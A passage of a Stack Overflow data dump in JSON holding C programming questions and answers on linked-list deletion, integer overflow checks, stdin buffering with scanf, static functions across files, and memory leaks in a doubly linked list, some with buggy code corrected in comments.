"https://www.gravatar.com/avatar/7c61d542de52e4638e7a263abb04ac9f?s=128&d=identicon&r=PG&f=1", "display_name": "Y.Jie", "link": "https://stackoverflow.com/users/10673575/y-jie"}, "is_accepted": false, "score": 0, "last_activity_date": 1551854727, "last_edit_date": 1551854727, "creation_date": 1551853881, "answer_id": 55016933, "question_id": 55016702, "link": "https://stackoverflow.com/questions/55016702/checking-if-pointer-is-null-gives-segmentation-fault/55016933#55016933", "title": "Checking if pointer is NULL gives segmentation fault", "body": "<p>try this:</p>\n\n<pre><code>void deleteAlt(struct Node *head){\n\n    struct Node * head_tmp=head;\n    struct Node * tmp=NULL;\n\n    while(head_tmp-&gt;next!=NULL){\n\n        tmp=head_tmp-&gt;next;\n\n        head_tmp-&gt;next=tmp-&gt;next;\n\n        head_tmp=tmp-&gt;next;\n\n        //do something for freeing tmp node \n\n    }\n\n\n}\n</code></pre>\n"}], "owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 823, "favorite_count": 0, "accepted_answer_id": 55016848, "answer_count": 3, "score": 1, "last_activity_date": 1551857150, "creation_date": 1551852778, "question_id": 55016702, "link": "https://stackoverflow.com/questions/55016702/checking-if-pointer-is-null-gives-segmentation-fault", "title": "Checking if pointer is NULL gives segmentation fault", "body": "<p>The problem statement: We have to delete every alternate node of a Linked List. \nEg: Original list: 1->2->3->4->5 to: 1->3->5</p>\n\n<p>complete problem statement: <a href=\"https://practice.geeksforgeeks.org/problems/delete-alternate-nodes/1/?ref=self\" rel=\"nofollow noreferrer\">https://practice.geeksforgeeks.org/problems/delete-alternate-nodes/1/?ref=self</a></p>\n\n<p>As you can see, this is a function problem so I'm not actually writing the complete code(just have to complete the function). Here is the code that I'm writing: </p>\n\n<pre><code>void deleteAlt(struct Node *head){\n    // Code here\n    struct Node *traverse=head,*alternate=head-&gt;next;\n\n    if(alternate-&gt;next==NULL)\n    {\n        head-&gt;next=NULL;\n        return;\n    }\n\n    while(traverse-&gt;next!=NULL &amp;&amp; alternate-&gt;next!=NULL)\n    {\n        traverse-&gt;next = alternate-&gt;next;\n        traverse = traverse-&gt;next;\n        alternate = traverse-&gt;next;\n        if((alternate-&gt;next)==NULL) //presence of this if statement causes segmentation fault\n        {\n            traverse-&gt;next=NULL;\n        }\n    }\n}\n</code></pre>\n\n<p>I have gone through similar problems on stackoverflow but their code and objective were different, like, not initializing the pointer and comparing it. However, my problem is different. </p>\n\n<p>In the case when number of nodes is even, <code>alternate</code> is always going to be NULL and hence there should be no initialization problem.</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 791, "user_id": 2422527, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5e3bbce8f736739dd113201ab2bade2c?s=128&d=identicon&r=PG&f=1", "display_name": "songziming", "link": "https://stackoverflow.com/users/2422527/songziming"}, "is_accepted": true, "score": -1, "last_activity_date": 1551852905, "creation_date": 1551852905, "answer_id": 55016724, "question_id": 55016534, "link": "https://stackoverflow.com/questions/55016534/math-equation-user-input-validation/55016724#55016724", "title": "Math equation user input validation", "body": "<p>You need to implement a simple parser to convert the equation string to AST.</p>\n\n<p>First step is lexical analysis, convert the equation string into a list of tokens.</p>\n\n<p>Next step is grammar analysis, you can write a top-down parser to do that. But before that, it's better to properly define your equation grammar formally, using notations like BNF.</p>\n\n<p>(If you only need to verify it, not computing the end result, better use a third party library.)</p>\n"}], "owner": {"reputation": 3, "user_id": 10063524, "user_type": "registered", "profile_image": "https://graph.facebook.com/680606478943596/picture?type=large", "display_name": "Igor Obradovi\u0107", "link": "https://stackoverflow.com/users/10063524/igor-obradovi%c4%87"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 55016724, "answer_count": 1, "score": -1, "last_activity_date": 1551852905, "creation_date": 1551852028, "question_id": 55016534, "link": "https://stackoverflow.com/questions/55016534/math-equation-user-input-validation", "title": "Math equation user input validation", "body": "<p>I got task to check math equation for example: x^3+(2x-23 -> needs to report an error and correct the mistake in x^3+(2*x-23).</p>\n\n<p>I need help with doing proper logic to solve this problem.</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1551854899, "post_id": 55016468, "comment_id": 96787930, "body": "duplicates: <a href=\"https://stackoverflow.com/q/7683685/995714\">How to check if overflow occured?</a>, <a href=\"https://stackoverflow.com/q/15920639/995714\">How to check if A+B exceed long long? (both A and B is long long)</a>,"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1551854908, "post_id": 55016468, "comment_id": 96787935, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/3422709/test-for-overflow-in-integer-addition\">Test for overflow in integer addition</a>"}], "answers": [{"comments": [{"owner": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "edited": false, "score": 0, "creation_date": 1551855273, "post_id": 55017253, "comment_id": 96788100, "body": "<code>signed_overflow</code> only works with <code>-fwrapv</code>. You need to perform the potentially overflowing additions in an unsigned type."}, {"owner": {"reputation": 8506, "user_id": 10808674, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/j1tGB.jpg?s=128&g=1", "display_name": "Alain Merigot", "link": "https://stackoverflow.com/users/10808674/alain-merigot"}, "reply_to_user": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "edited": false, "score": 0, "creation_date": 1551855642, "post_id": 55017253, "comment_id": 96788247, "body": "Right. Updated the answer. Thanks for spotting this."}, {"owner": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "edited": false, "score": 0, "creation_date": 1551899243, "post_id": 55017253, "comment_id": 96813384, "body": "Now the comparison is never true because unsigned values are not negative. If you want to use the <code>^</code>/<code>&amp;</code> hack, you really need that GCC extension."}], "tags": [], "owner": {"reputation": 8506, "user_id": 10808674, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/j1tGB.jpg?s=128&g=1", "display_name": "Alain Merigot", "link": "https://stackoverflow.com/users/10808674/alain-merigot"}, "is_accepted": false, "score": 2, "last_activity_date": 1551900471, "last_edit_date": 1551900471, "creation_date": 1551855188, "answer_id": 55017253, "question_id": 55016468, "link": "https://stackoverflow.com/questions/55016468/builtin-add-overflow-function-supported-in-gcc-5-and-above-and-what-functions/55017253#55017253", "title": "__builtin_add_overflow function supported in gcc 5 and above and what functions could replace it in gcc 4.6?", "body": "<p>Overflow detection depends on the type of your vars.</p>\n\n<p>If they are unsigned, it is sufficient to detect if the result is lower than one of its operand.</p>\n\n<pre><code>inline unsigned_overflow(unsigned a, unsigned b){\n  return (a+b)&lt;a;\n</code></pre>\n\n<p>If both are unsigned, oveflows can only happen if operands are of the same sign and the sign of the result will be different. So there is overflow if the sign of result is different from the sign  of its two operands.</p>\n\n<pre><code>inline signed_overflow(int a, int b){\n  unsigned ua=a, ub=b;\n  return (int)(((ua^(ua+ub))&amp;((ub^(ua+ub)))&lt;0  ;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "is_accepted": false, "score": 1, "last_activity_date": 1551855222, "creation_date": 1551855222, "answer_id": 55017259, "question_id": 55016468, "link": "https://stackoverflow.com/questions/55016468/builtin-add-overflow-function-supported-in-gcc-5-and-above-and-what-functions/55017259#55017259", "title": "__builtin_add_overflow function supported in gcc 5 and above and what functions could replace it in gcc 4.6?", "body": "<p>You need to write it on your own.  If the arguments are unsigned, it is not too hard to do (just compare if the sum is smaller than one of the addends in the larger input type).  The overflow check for signed integer arithmetic can be rather complex, particularly if all three integer types are different.  There is a GCC extension that helps somewhat: conversion from unsigned to signed types does not trigger undefined behavior, but reduces the value according to two's complement arithmetic.  So you can use this:</p>\n\n<pre><code>  unsigned x1 = x1;\n  unsigned y1 = y1;\n  bool overflow = (int) (((x + y) ^ x) &amp; (x + y) ^ y))) &lt; 0;\n</code></pre>\n\n<p>The book <a href=\"http://www.informit.com/articles/article.aspx?p=1959565&amp;seqNum=13\" rel=\"nofollow noreferrer\">Hacker's Delight</a> discusses such topics extensively.</p>\n"}], "owner": {"reputation": 171, "user_id": 9634950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/886d82b0453cdf11cae301f2548bd714?s=128&d=identicon&r=PG&f=1", "display_name": "Melvin Levett", "link": "https://stackoverflow.com/users/9634950/melvin-levett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 336, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1551900471, "creation_date": 1551851719, "question_id": 55016468, "link": "https://stackoverflow.com/questions/55016468/builtin-add-overflow-function-supported-in-gcc-5-and-above-and-what-functions", "title": "__builtin_add_overflow function supported in gcc 5 and above and what functions could replace it in gcc 4.6?", "body": "<p>I built a simple applet code which has a unsupported function <code>__builtin_add_overflow</code> in my gcc version 4.6. Considering some reasons I don't want to update my gcc version. So what function in my gcc version could use to replace that function ?</p>\n"}, {"tags": ["c", "linux", "stdio"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551851361, "post_id": 55016092, "comment_id": 96786599, "body": "When <code>scanf()</code> gets to the end of the first buffer full, it goes back to the system to get more.  The buffer is merely a convenience and optimization measure."}, {"owner": {"reputation": 4425, "user_id": 5983841, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/GHJxG.jpg?s=128&g=1", "display_name": "Rick", "link": "https://stackoverflow.com/users/5983841/rick"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551854041, "post_id": 55016092, "comment_id": 96787612, "body": "@JonathanLeffler Hmmm, that inspires me. Like a standard I/O of a regular file, the stream buffer is normally 4K but it doesn&#39;t mean that the file can&#39;t be larger than 4K, which is the same here. Thanks again :). I would like to mark that as the answer"}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 3, "last_activity_date": 1551854860, "creation_date": 1551854860, "answer_id": 55017167, "question_id": 55016092, "link": "https://stackoverflow.com/questions/55016092/why-scanf-can-read-more-than-1024-character-while-stdin-stream-buffer-is-1024-by/55017167#55017167", "title": "Why scanf can read more than 1024 character while stdin stream buffer is 1024 bytes only?", "body": "<p>As noted in a comment, when <code>scanf()</code> gets to the end of the first buffer full, if it still needs more data, it goes back to the system to get more, possibly many times.  The buffer is merely a convenience and optimization measure.</p>\n"}], "owner": {"reputation": 4425, "user_id": 5983841, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/GHJxG.jpg?s=128&g=1", "display_name": "Rick", "link": "https://stackoverflow.com/users/5983841/rick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 282, "favorite_count": 0, "accepted_answer_id": 55017167, "answer_count": 1, "score": 2, "last_activity_date": 1551854860, "creation_date": 1551849920, "last_edit_date": 1551850380, "question_id": 55016092, "link": "https://stackoverflow.com/questions/55016092/why-scanf-can-read-more-than-1024-character-while-stdin-stream-buffer-is-1024-by", "title": "Why scanf can read more than 1024 character while stdin stream buffer is 1024 bytes only?", "body": "<p>I can get <code>stdin</code> stream buffer size and buffer type that connected my terminal under Ubuntu, by the code from <em>APUE</em>:</p>\n\n\n\n<pre><code>#include \"apue.h\" //It's merely a wrapper header\n\nvoid    pr_stdio(const char *, FILE *);\nint     is_unbuffered(FILE *);\nint     is_linebuffered(FILE *);\nint     buffer_size(FILE *);\n\nint\nmain(void)\n{\n    FILE    *fp;\n\n    fputs(\"enter any character\\n\", stdout);\n    if (getchar() == EOF)\n        err_sys(\"getchar error\");\n    fputs(\"one line to standard error\\n\", stderr);\n\n    pr_stdio(\"stdin\",  stdin);\n    pr_stdio(\"stdout\", stdout);\n    pr_stdio(\"stderr\", stderr);\n\n    if ((fp = fopen(\"/etc/passwd\", \"r\")) == NULL)\n        err_sys(\"fopen error\");\n    if (getc(fp) == EOF)\n        err_sys(\"getc error\");\n    pr_stdio(\"/etc/passwd\", fp);\n    exit(0);\n}\n\nvoid\npr_stdio(const char *name, FILE *fp)\n{\n    printf(\"stream = %s, \", name);\n    if (is_unbuffered(fp))\n        printf(\"unbuffered\");\n    else if (is_linebuffered(fp))\n        printf(\"line buffered\");\n    else /* if neither of above */\n        printf(\"fully buffered\");\n    printf(\", buffer size = %d\\n\", buffer_size(fp));\n}\n\nint\nis_unbuffered(FILE *fp)\n{\n    return(fp-&gt;_flags &amp; _IO_UNBUFFERED);\n}\n\nint\nis_linebuffered(FILE *fp)\n{\n    return(fp-&gt;_flags &amp; _IO_LINE_BUF);\n}\n\nint\nbuffer_size(FILE *fp)\n{\n    return(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);\n}\n</code></pre>\n\n<hr>\n\n<p>Run the code above from terminal I got: <code>stream = stdin, line buffered, buffer size = 1024</code>.</p>\n\n<hr>\n\n<p>Then I write a test:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include \"stdio.h\"\n\nint main(){\n    char c[2048];\n    c[1033] = 'a';\n    scanf(\"%s\", c); //I paste 1440 '1' into the terminal.\n    printf(\"%c\", c[1033]); //I expect it to be 'a'.\n    return 0;\n}\n</code></pre>\n\n<p>I paste 1440(>1024 byte) character '1' to the terminal and expect excess input data would be discarded somehow, for the line buffer size is only 1024 byte. But eventually, I got '1' printed with <code>c[1033]</code>.</p>\n\n<p>Why can <code>scanf</code> read more than 1024 character while buffer size of <code>stdin</code> is 1024B only? </p>\n\n<p>Quoted from <em>APUE</em>:</p>\n\n<blockquote>\n  <p>We can see that the default for this system is to have standard input and standard\n  output line buffered when they\u2019re connected to a terminal. The line buffer is 1,024\n  bytes. <strong>Note that this doesn\u2019t restrict us to 1,024-byte input and output lines; that\u2019s just\n  the size of the buffer.</strong> Writing a 2,048-byte line to standard output will require two\n  write system calls.</p>\n</blockquote>\n\n<p>Or maybe should I ask how?</p>\n\n<p>I don't understand the emphasized text much. Doesn't a buffer restrict user input size? Why it says I can input more than buffer size data (<strong>for each input</strong>)? Could someone tell me that how does it work?</p>\n"}, {"tags": ["c", "static", "global-variables"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551848797, "post_id": 55015889, "comment_id": 96785818, "body": "When you included <code>a.c</code>, the static function was defined in the current translation unit or TU. The functions become visible to the code in the TU.  This is why you include headers, not source code, usually."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1551848906, "post_id": 55015889, "comment_id": 96785846, "body": "<code>#include &quot;a.c&quot;</code>...that&#39;s not how your use the source files. You compile and link them together, you don&#39;t include them in other source files!!"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551985957, "post_id": 55015889, "comment_id": 96852203, "body": "do NOT <code>#include</code> c source files.  Rather compile them separately and then link them together .  Write a header file that has the prototypes and extern statements for any thing needed across files and include that header file in every file that needs those cross file references, including the file that contains the actual references"}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 2, "last_activity_date": 1551849154, "creation_date": 1551849154, "answer_id": 55015960, "question_id": 55015889, "link": "https://stackoverflow.com/questions/55015889/global-static-function-still-working-in-another-file/55015960#55015960", "title": "Global static function still working in another file", "body": "<p>You don't include a source file in another, you compile and link them together.</p>\n\n<p>In you case, by saying <code>#include \"a.c\"</code>, you're essentially putting the whole content of <code>a.c</code> into <code>b.c</code> and then starting the compilation, so the <code>static</code> functions and their calls are present in the same translation unit. Thus, there is no issue for compiler to find the called function.</p>\n\n<p>Instead, if you do something like</p>\n\n<pre><code>gcc a.c b.c -o a.out //try to compile and link together\n</code></pre>\n\n<p>you'll see the expected error, as in this case, <code>a.c</code> and <code>b.c</code> will be two separate translation units.</p>\n"}, {"tags": [], "owner": {"reputation": 126, "user_id": 10973714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5fFjJ.jpg?s=128&g=1", "display_name": "heeat", "link": "https://stackoverflow.com/users/10973714/heeat"}, "is_accepted": false, "score": 0, "last_activity_date": 1551849650, "last_edit_date": 1551849650, "creation_date": 1551849410, "answer_id": 55016002, "question_id": 55015889, "link": "https://stackoverflow.com/questions/55015889/global-static-function-still-working-in-another-file/55016002#55016002", "title": "Global static function still working in another file", "body": "<p>You declare in <code>header</code> files and define in <code>.c</code> files. So you must use header files to represent the variables or functions you defined. Instead if you use <code>.c</code> files then it leads to multiple definitions.I think that is why you can access that global function.</p>\n"}], "owner": {"reputation": 21, "user_id": 11157696, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-vAqi2O7mstM/AAAAAAAAAAI/AAAAAAAAABo/2At4AqlrZns/photo.jpg?sz=128", "display_name": "Kunal Gupta", "link": "https://stackoverflow.com/users/11157696/kunal-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1551849650, "creation_date": 1551848613, "question_id": 55015889, "link": "https://stackoverflow.com/questions/55015889/global-static-function-still-working-in-another-file", "title": "Global static function still working in another file", "body": "<p>I declared a global static function in one file</p>\n\n<p>a.c</p>\n\n<pre><code>static void Func1(void);\nvoid Func2(void);\n\nvoid Func1(void) {\n    puts(\"Func1 Called\");\n}\n\nvoid Func2(void) {\n    puts(\"Func2 Called\");\n}\n</code></pre>\n\n<p>and accessed it in b.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"a.c\"\nvoid main() {\n    Func1();\n    Func2();\n}\n</code></pre>\n\n<p>the program complied successfully, but as per provided information this should give error: <code>undefined reference to Func1</code>. What wrong is happening here?</p>\n"}, {"tags": ["c", "pointers", "memory-management", "memory-leaks"], "answers": [{"comments": [{"owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551850016, "post_id": 55016003, "comment_id": 96786165, "body": "Thanks for the answer. Why do you say &quot;Node *new =...&quot; is obviously wrong? what&#39;s wrong with it? This is the syntax my prof has been showing us when using malloc...Anyways, it&#39;s the same syntax as <code>Node *temp = </code>. The program compiles and runs as it should, it just seems like I misunderstand something about where and when to free up memory."}, {"owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551850093, "post_id": 55016003, "comment_id": 96786193, "body": "Ah, I see, it&#39;s a convention not to call things &quot;new&quot; I suppose. I might as well change that as a matter of course, I thought it didn&#39;t matter since it&#39;s just a name for the pointer."}, {"owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551850281, "post_id": 55016003, "comment_id": 96786247, "body": "<code>arrSize</code> is an int which describes the length of the array. Inside the loop, I&#39;m dealing with array elements of the form <code>array [arrSize-i]</code>, so letting <code>i</code> reach all the way to <code>arrSize</code> seems appropriate if I want to access <code>array[0]</code>."}, {"owner": {"reputation": 149, "user_id": 9306292, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fefb83e0b1c0b3ab60e314b61d560c35?s=128&d=identicon&r=PG&f=1", "display_name": "Jay-Pi", "link": "https://stackoverflow.com/users/9306292/jay-pi"}, "reply_to_user": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551850809, "post_id": 55016003, "comment_id": 96786400, "body": "Ah, you want to count backwards. Still thats weird. You start with an offset of 2 to go backwards. I would expect to start at 0 or an explicit comment."}], "tags": [], "owner": {"reputation": 149, "user_id": 9306292, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fefb83e0b1c0b3ab60e314b61d560c35?s=128&d=identicon&r=PG&f=1", "display_name": "Jay-Pi", "link": "https://stackoverflow.com/users/9306292/jay-pi"}, "is_accepted": false, "score": 1, "last_activity_date": 1551849941, "last_edit_date": 1551849941, "creation_date": 1551849410, "answer_id": 55016003, "question_id": 55015887, "link": "https://stackoverflow.com/questions/55015887/memory-leaks-in-doubly-linked-list/55016003#55016003", "title": "Memory leaks in doubly linked list", "body": "<ol>\n<li>Change <code>sizeof(Node * )</code> to <code>sizeof(Node)</code> due to malloc reserving you memory for which the pointer points to and it needs the correct amount of needed memory (which is not a pointer but the object itself).</li>\n<li><code>i &lt;= arrSize</code> might be an overflow, since the size usually is given as amount of memory cells. So you might consider using <code>i &lt; arrSize</code></li>\n<li>The first while loop in the insert_after might point to invalid memory after the array</li>\n<li><code>Node *new =</code> is ugly syntax, since new is a keyword in C++. Please never do that, since that will break any code, which is being used in C++.</li>\n<li>You dont need a temporary element in <code>kill()</code>. You can instead going until head points to NULL.</li>\n<li>delete_element needs the same array checks as <code>insert_after</code></li>\n</ol>\n\n<p>Probably you need to debug the whole thing pasting one function after the other to get it properly working. No guarantee for correctness, since that was abit hard to read without comments and all.</p>\n"}, {"tags": [], "owner": {"reputation": 729, "user_id": 11060870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a74dd465c0373f529ebe6f9ee7592add?s=128&d=identicon&r=PG", "display_name": "ccxxshow", "link": "https://stackoverflow.com/users/11060870/ccxxshow"}, "is_accepted": true, "score": 1, "last_activity_date": 1551852195, "creation_date": 1551852195, "answer_id": 55016565, "question_id": 55015887, "link": "https://stackoverflow.com/questions/55015887/memory-leaks-in-doubly-linked-list/55016565#55016565", "title": "Memory leaks in doubly linked list", "body": "<p>There are two problems:</p>\n\n<ol>\n<li>Need to change all <code>malloc (sizeof(Node*))</code> to <code>malloc (sizeof(Node))</code></li>\n<li>Need to change <code>free(header)</code> to <code>free(current)</code> in the kill function.</li>\n</ol>\n\n<p>The modified code is as follows</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Node {\n    int data;\n    struct Node *next;\n    struct Node *previous;\n} Node;\n\nvoid print_dll(Node *head)\n{\n    Node *curr = head;\n    while(curr != NULL) {\n        printf(\"%d\\t\", curr-&gt;data);\n        curr = curr-&gt;next;\n    }\n    puts(\" \");\n}\n\nNode *create_dll_from_array(int array [], int arrSize)\n{\n    //this is a function that creates a doubly linked list\n    //with the contents of the array\n    Node *current = (Node *) malloc (sizeof(Node));\n    current-&gt;data = array[arrSize - 1];\n    current -&gt; next = NULL;\n\n    for(int i = 2; i &lt;= arrSize; i++) {\n        //create a new node\n        Node *temp = (Node *)malloc(sizeof(Node));\n        //I would like the dll to be in the same order as the array, I guess it isn't strictly necessary\n        temp -&gt;data = array[arrSize - i];\n        temp -&gt; next = current;\n        current-&gt; previous = temp;\n        //now make temp the current\n        current = temp;\n    }\n    current-&gt; previous = NULL;\n    return current;\n}\n\nvoid insert_after(Node *head, int valueToInsertAfter, int valueToInsert )\n{\n    if(head != NULL) {\n        Node *current = head;\n\n        while(current-&gt; data != valueToInsertAfter) {\n            //this while loop brings 'current' to the end of the list if\n            //the searched value is not there\n            if(current-&gt; next != NULL) {\n                current = current-&gt;next;\n            } else {\n                break;\n            }\n        }\n        //after exiting this loop, the current pointer is pointing\n        //either to the last element of the dll or to the element\n        //we need to insert after\n\n        Node *new = (Node *) malloc (sizeof(Node));\n        new-&gt;data = valueToInsert;\n        new-&gt;next = current-&gt;next;\n        new-&gt;previous = current;\n        if(current-&gt;next != NULL) {\n            (current-&gt;next)-&gt;previous = new;\n        }\n        current-&gt;next = new;\n    }\n}\n\nvoid delete_element(Node *head, int valueToBeDeleted)\n{\n    //work in progress\n}\nvoid kill(Node *head)\n{\n//this is my attempt at freeing all the nodes in the doubly linked list\n    Node *current;\n    while(head != NULL) {\n        current = head;\n        head = head-&gt;next;\n        free(current);\n    }\n}\nint main()\n{\n    int array [5] = {11, 2, 7, 22, 4};\n    Node *head;\n\n    /*Question 1*/\n    //creates a doubly linked list from the array below\n    head = create_dll_from_array(array, 5); ///size of the array is 5\n\n    /* Question 2 */\n    // print_dll(head);\n\n    /*Question 3*/\n    // to insert 13 after the first appearance of 7\n    insert_after(head, 7, 13);\n    print_dll(head);\n    //to insert 29 after first appearance of 21\n    insert_after(head, 21, 29);\n    print_dll(head);\n\n    /*Question 6*/\n    //create a function to free the whole list\n\n    kill(head);\n\n\n    return 0;\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3268, "user_id": 182634, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d5b602ab0bc363e3e990f2e904b671d?s=128&d=identicon&r=PG", "display_name": "eyalm", "link": "https://stackoverflow.com/users/182634/eyalm"}, "is_accepted": false, "score": 1, "last_activity_date": 1551856823, "creation_date": 1551856823, "answer_id": 55017633, "question_id": 55015887, "link": "https://stackoverflow.com/questions/55015887/memory-leaks-in-doubly-linked-list/55017633#55017633", "title": "Memory leaks in doubly linked list", "body": "<p>The best way to find memory leaks is using valgrind (or a similar tool) in run time.\nValgrind will identify any memory leak or violation you ran through.</p>\n\n<p>to run valgrind in linux environment, all you need to do is:</p>\n\n<pre><code># valgrind --leak-check=full ./my_program\n</code></pre>\n\n<p>In you case it gave mainy theses errors:</p>\n\n<pre><code>==28583== Invalid read of size 8\n==28583==    at 0x400871: kill (aaa.c:77)\n==28583==    by 0x40092D: main (aaa.c:103)\n==28583==  Address 0x5204188 is 0 bytes after a block of size 8 alloc'd\n==28583==    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==28583==    by 0x40073A: create_dll_from_array (aaa.c:29)\n==28583==    by 0x4008D9: main (aaa.c:87)\n</code></pre>\n\n<p>this error means the allocation size was too small. as mentioned in another answers it is because you allocate enough memory for a pointer and not for the struct.</p>\n"}], "owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "delete_vote_count": 0, 